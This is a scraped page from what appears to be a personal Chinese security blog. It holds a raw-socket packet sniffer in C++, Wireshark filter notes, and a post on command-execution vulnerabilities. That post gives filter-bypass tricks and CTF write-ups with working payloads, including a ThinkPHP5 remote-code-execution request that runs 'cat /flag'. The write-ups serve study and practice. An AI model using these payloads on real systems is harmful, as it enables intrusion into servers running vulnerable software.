class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mstcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;IP_HEAD.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> number;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DecodeIP</span><span class="params">(<span class="keyword">char</span>* buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = len;</span><br><span class="line">    <span class="keyword">if</span> (n &gt;= <span class="keyword">sizeof</span>(IP_HEAD))</span><br><span class="line">    &#123;</span><br><span class="line">        IP_HEAD iphead;</span><br><span class="line">        iphead = *(IP_HEAD*)buf;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;第 &quot;</span> &lt;&lt; number++ &lt;&lt; <span class="string">&quot; 个IP数据包信息：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;协议版本:&quot;</span> &lt;&lt; (iphead.ver_hlen &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;总长度:&quot;</span> &lt;&lt; ntohs(iphead.wPacketLen) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//网络字节序转为主机字节序</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;标志位:&quot;</span> &lt;&lt; <span class="string">&quot;DF=&quot;</span> &lt;&lt; ((iphead.Flags &gt;&gt; <span class="number">14</span>) &amp; <span class="number">0x01</span>) &lt;&lt; <span class="string">&quot;,MF=&quot;</span> &lt;&lt; ((iphead.Flags &gt;&gt; <span class="number">13</span>) &amp; <span class="number">0x01</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;片偏移:&quot;</span> &lt;&lt; (iphead.FragOf &amp; <span class="number">0x1fff</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;协议:&quot;</span> &lt;&lt; <span class="keyword">int</span>(iphead.byProtocolType) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;源地址:&quot;</span> &lt;&lt; inet_ntoa(*(in_addr*)&amp;iphead.dwIPSrc) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;目的地址:&quot;</span> &lt;&lt; inet_ntoa(*(in_addr*)&amp;iphead.dwIPDes) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;---------------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AutoWSACleanup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ::WSACleanup();  <span class="comment">// 终止Winsock的使用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    WSADATA wd;  <span class="comment">//一种数据结构,这个结构被用来存储被WSAStartup函数调用后返回的Windows Sockets数据,它包含Winsock.dll执行的数据。</span></span><br><span class="line">    n = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wd);  <span class="comment">//返回winsock服务初始化是否成功，若返回1则输出错误</span></span><br><span class="line">    <span class="keyword">if</span> (n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;WSAStartup函数错误！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    atexit(AutoWSACleanup);</span><br><span class="line">    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);  <span class="comment">//创建SOCKET</span></span><br><span class="line">    <span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取本机地址</span></span><br><span class="line">    <span class="keyword">char</span>  name[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == gethostname(name, <span class="keyword">sizeof</span>(name)))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>* <span class="title">pHostent</span>;</span></span><br><span class="line">    pHostent = gethostbyname(name);</span><br><span class="line">    <span class="comment">//绑定本地地址到SOCKET</span></span><br><span class="line">    sockaddr_in addr;</span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_addr = *(in_addr*)pHostent-&gt;h_addr_list[<span class="number">0</span>]; <span class="comment">//IP</span></span><br><span class="line">    addr.sin_port = <span class="number">8888</span>; <span class="comment">//端口，IP层端口可随意填</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == bind(sock, (sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置该SOCKET为接收所有流经绑定的IP的网卡的所有数据，包括接收和发送的数据包</span></span><br><span class="line">    u_long sioarg = <span class="number">1</span>;</span><br><span class="line">    DWORD wt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == WSAIoctl(sock, SIO_RCVALL, &amp;sioarg, <span class="keyword">sizeof</span>(sioarg), <span class="literal">NULL</span>, <span class="number">0</span>, &amp;wt, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//我们只需要接收数据，因此设置为阻塞IO，使用最简单的IO模型</span></span><br><span class="line">    u_long bioarg = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == ioctlsocket(sock, FIONBIO, &amp;bioarg))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//开始接收数据</span></span><br><span class="line">    <span class="comment">//因为前面已经设置为阻塞IO，recv在接收到数据前不会返回。</span></span><br><span class="line">    number = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">65535</span>];</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        len = recv(sock, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            DecodeIP(buf, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (len &gt; <span class="number">0</span>);</span><br><span class="line">    closesocket(sock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后来尝试用Python的socket模块进行编程，但是socket在Windows环境下不时出现Winerror，windows下基于python的socket编程资料也比较少，很难以解决，最后转向Linux。我推测原因在于Windows下对于socket的操作函数已经传入的参数设置可能于Linux存在不同，因而产生报错。在虚拟机Ubuntu20.04的开发环境完成程序的编写以及界面的编写。</p>
<p>关于软件的代码见<a target="_blank" rel="noopener" href="https://github.com/gorgeousdays/Package-analyse。存在诸多bug，由于在windows环境下测试不了，在Ubuntu虚拟机下测试性能太差，很难对代码进行Debug。">https://github.com/gorgeousdays/Package-analyse。存在诸多bug，由于在windows环境下测试不了，在Ubuntu虚拟机下测试性能太差，很难对代码进行Debug。</a></p>
<p>目前问题：</p>
<ol>
<li>只能抓包一次，即需要对socket的创建进行控制。</li>
<li>关于过滤器的编写，实现对抓取到的报文的过滤操作</li>
<li>优化问题，实现对TCP首部的分析，实现对所有报文的抓取分析以及过滤。</li>
</ol>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/charlesblc/p/6235437.html">https://www.cnblogs.com/charlesblc/p/6235437.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/riacool/archive/2010/12/14/1905404.html">https://www.cnblogs.com/riacool/archive/2010/12/14/1905404.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yunya-cnblogs/p/13198409.html">https://www.cnblogs.com/yunya-cnblogs/p/13198409.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=r59LJARW8hU">https://www.youtube.com/watch?v=r59LJARW8hU</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.kissg.me">https://blog.kissg.me</a></p>
<p><a target="_blank" rel="noopener" href="https://realpython.com/python-sockets/">https://realpython.com/python-sockets/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.steves-internet-guide.com/tcpip-ports-sockets/#comment-1821">http://www.steves-internet-guide.com/tcpip-ports-sockets/#comment-1821</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/01/2020%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/01/2020%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">2020总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-01-01 00:01:57 / 修改时间：00:04:28" itemprop="dateCreated datePublished" datetime="2021-01-01T00:01:57+08:00">2021-01-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%97%B6%E9%97%B4%E7%9A%84%E6%9C%8B%E5%8F%8B/" itemprop="url" rel="index"><span itemprop="name">时间的朋友</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          Welcome to my blog, enter password to read.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2021/01/01/2020%E6%80%BB%E7%BB%93/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">命令执行漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-06 17:20:35" itemprop="dateCreated datePublished" datetime="2020-12-06T17:20:35+08:00">2020-12-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-05 16:47:03" itemprop="dateModified" datetime="2021-01-05T16:47:03+08:00">2021-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h4><p>cmd与bash的一些规则</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>Windows</th>
<th>Linux</th>
</tr>
</thead>
<tbody>
<tr>
<td>转义字符</td>
<td>^</td>
<td>\</td>
</tr>
<tr>
<td>多条命令执行</td>
<td>&amp;&amp;、%0a</td>
<td>&amp;&amp;、；、$()、``、%0a、%0d</td>
</tr>
<tr>
<td>注释符号</td>
<td>：：</td>
<td>#</td>
</tr>
</tbody>
</table>
</div>
<p>除此之外，再Windows和Linux环境下还可以通过||来进行多条命令的执行，但是&amp;&amp;与||存在惰性原则，and一个不成立就不执行第二个，or若第一个成立也不执行第二个</p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h5><p>有时题目对过滤掉空格，于是我们可以采用以下方法来构造</p>
<ol>
<li>用<code>%00-%ff</code>区间的字符串测试，如<code>%09</code></li>
<li>在windows下通过<code>%ProgramFiles:~10,1%</code>获取空格<br><code>~</code>为截取符<code>%ProgramFile%</code>一般为<code>C:Program Files</code>截取从第十个字符开始的一个字符，即为空格</li>
<li>Linux下<ul>
<li><code>$IFS$9</code></li>
<li><code>&#123;cmd,args&#125;</code>  对<code>bash</code>有效，对<code>zsh、dash</code>无效</li>
<li><code>cat&lt;&gt;flag</code>  读取文件时</li>
<li>e.g.<code>echo$IF$9aaaa</code>    <code>&#123;echo,aaaa&#125;</code></li>
</ul>
</li>
</ol>
<h5 id="黑名单关键字"><a href="#黑名单关键字" class="headerlink" title="黑名单关键字"></a>黑名单关键字</h5><p>有时题目对过滤掉<code>cat flag</code>等关键字，于是我们可以采用以下方法来构造</p>
<ol>
<li><p><strong>变量拼接</strong>  <code>Linux:a=c;b=at;c=he;d=llo;$a$b $&#123;c&#125;$&#123;d&#125;</code><br>给变量重新赋值 拼接后为<code>cat flag</code></p>
</li>
<li><p><strong>使用通配符</strong>  <code>Linux:cat /tm?/fl*</code>    <code>Windows:type fla*</code><br>?代表任意一个字符串，*则代表任意个字符创</p>
</li>
<li><p><strong>借用已有字符串</strong> 如果禁用<code>&lt;&gt;?</code>等字符串，则可以借用其他文件中的字符串，利用<code>substr()</code>函数来截取某个特定字符串。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> test.php;</span><br><span class="line">?&gt;</span><br><span class="line">root@kali:<span class="built_in">echo</span> `expr substr $(awk NR==1 test.php) 1 1`</span><br><span class="line">&lt;</span><br><span class="line">root@kali:<span class="built_in">echo</span> `expr substr $(awk NR==3 test.php) 2 1`</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="执行无回显"><a href="#执行无回显" class="headerlink" title="执行无回显"></a>执行无回显</h5><ol>
<li>HTTP通道</li>
<li>DNS通道</li>
<li>时间盲注</li>
<li>写入文件，二次返回</li>
</ol>
<h4 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h4><h5 id="GitHack"><a href="#GitHack" class="headerlink" title="GitHack"></a><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">GitHack</a></h5><p>存在git泄露 扫码网站得到index.php</p>
<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先传入参数<code>exp</code>，第一个和第三个if过滤掉了协议以及关键词</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;]))</span><br></pre></td></tr></table></figure>
<p>第二个if表明所给的<code>exp</code>在去掉字母括号后为<code>;</code></p>
<h5 id="构造"><a href="#构造" class="headerlink" title="构造."></a>构造<code>.</code></h5><p>源码在<code>flag.php</code>中</p>
<p>我们可以通过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>来扫码当前目录下的文件，但是<code>.</code>符号已经被过滤</p>
<p>于是我们可以构造<code>.</code>号，有以下两种方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
<p>从而获取到了5个文件，<code>flag.php</code>为数组的倒数第二个元素</p>
<h5 id="获取falg-php"><a href="#获取falg-php" class="headerlink" title="获取falg.php"></a>获取falg.php</h5><p>为了获取倒数第二个元素，我们可以通过<code>array_rand(array_filp())</code>随机从数组中取值。其中<code>array_flip()</code>交换数组的键和值，<code>array_rand()</code>从数组中随机取出一个或多个单元。</p>
<p>构造<code>payload</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>由于是随机取值，多刷新几遍网页就可以得到flag</p>
<h4 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h4><p>发现网页由THINKPHP5驱动，发现其存在<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3845">漏洞</a>,即可通过Post操作传入下列参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;</span><br></pre></td></tr></table></figure>
<p>这是应对漏洞的一种格式固定的操作。有以上两种方法。等号后面跟的是命令。</p>
<p>先传参查看目录结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure>
<p>后获取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">流量分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-11-29 21:34:01 / 修改时间：21:34:48" itemprop="dateCreated datePublished" datetime="2020-11-29T21:34:01+08:00">2020-11-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="Wireshark常用过滤指令"><a href="#Wireshark常用过滤指令" class="headerlink" title="Wireshark常用过滤指令"></a>Wireshark常用过滤指令</h4><p>过滤IP：<code>ip.src eq x.x.x.x or ip.dst eq x.x.x.x</code></p>
<p>•过滤端口：<code>tcp.port eq 80 or udp.port eq 80</code></p>
<p>•过滤协议：<code>tcp/udp/http/tls/ssl/icmp/ftp/dns/ip</code></p>
<p>•http过滤模式：</p>
<p>​     •<code>http.request.method == “GET”</code></p>
<p>​     •<code>http.request.method == “POST”</code></p>
<p>​     •<code>http.request.uri == “[路由地址]”</code></p>
<p>​     •<code>[协议] contains “[关键字]”</code></p>
<h4 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h4><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。</p>
